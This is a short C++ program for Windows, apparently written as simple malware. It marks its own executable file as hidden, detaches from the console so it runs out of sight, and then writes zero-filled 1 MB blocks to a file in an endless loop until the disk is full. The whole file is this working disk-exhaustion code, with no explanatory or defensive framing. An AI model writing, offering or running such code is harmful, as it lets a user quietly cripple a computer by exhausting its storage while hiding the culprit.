#include <iostream>
#include <fstream>
#include <windows.h>

void createLargeFile() {
    std::ofstream largeFile("largeFile.txt", std::ios::binary);

    if (!largeFile.is_open()) {
        std::cerr << "Error opening file" << std::endl;
        return;
    }

    const size_t bufferSize = 1024 * 1024; // 1 MB buffer
    char *buffer = new char[bufferSize];
    memset(buffer, '0', bufferSize);

    try {
        while (true) {
            largeFile.write(buffer, bufferSize);
            if (largeFile.fail()) {
                throw std::runtime_error("Disk is full");
            }
        }
    } catch (const std::exception &e) {
        std::cerr << e.what() << std::endl;
    }

    delete[] buffer;
    largeFile.close();
}

void runInBackground() {
    FreeConsole(); // Detach from the console window

    createLargeFile();
}
void hideExecutable(const char* exePath) {
    // Set the file attributes to hidden
    if (SetFileAttributes(exePath, FILE_ATTRIBUTE_HIDDEN)) {
        std::cout << "File successfully hidden." << std::endl;
    } else {
        std::cout << "Failed to hide the file. Error: " << GetLastError() << std::endl;
    }
}

int main() {
     char exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);

    // Hide the executable
    hideExecutable(exePath);

    // Your main program logic here
    std::cout << "Executable is running..." << std::endl;

    // Keep the program running for a while to see the message
    Sleep(5000);
    runInBackground();
    return 0;
}
